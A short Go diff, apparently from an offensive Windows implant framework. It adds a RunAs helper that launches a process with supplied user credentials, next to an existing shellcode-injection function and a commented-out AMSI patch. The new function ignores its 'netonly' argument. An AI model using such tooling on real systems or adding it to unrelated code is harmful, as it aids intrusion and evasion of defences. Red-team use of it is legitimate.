@@ -8,6 +8,8 @@ import (
 	"syscall"
 	"unsafe"
 
+	"github.com/Pascal-0x90/gscript/x/windows/advapi32"
+	"github.com/Pascal-0x90/gscript/x/windows/process"
 	"github.com/mitchellh/go-ps"
 	"golang.org/x/sys/windows/registry"
 )
@@ -347,6 +349,16 @@ func InjectShellcode(pid_int int, payload []byte) error {
 
 	// all good!
 	return nil
+}
+
+func RunAs(user, password, proc, cmdline string, netonly bool) (int, error) {
+	logonType := advapi32.LOGON_WITH_PROFILE
+	procInfo, err := process.CreateProcessWithLogonN(user, "", password, proc, cmdline, logonType, false)
+	if err != nil {
+		return -1, err
+	}
+
+	return procInfo.ProcessId, nil
 }
 
 // func PatchAmsi(pid_int int) error {
